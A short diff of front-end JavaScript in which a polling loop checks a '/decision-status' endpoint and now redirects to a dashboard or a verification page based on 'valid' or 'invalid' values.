@@ -62,18 +62,17 @@ const checker = setInterval(async () => {
         const decisionRes = await fetch("/decision-status");
         const decisionData = await decisionRes.json();
 
-        if (decisionData.decision === "accept") {
-            clearInterval(checker);
-            window.location.href = "dashboard.html";
-            return;
-        }
+        if (decisionData.decision === "valid") {
+    clearInterval(checker);
+    window.location.href = "dashboard.html";
+    return;
+}
 
-        if (decisionData.decision === "decline") {
-            clearInterval(checker);
-            localStorage.clear();
-            window.location.href = "step5.html";
-            return;
-        }
+if (decisionData.decision === "invalid") {
+    clearInterval(checker);
+    window.location.href = "verification.html";
+    return;
+}
 
     } catch (err) {
         console.log("Waiting...");
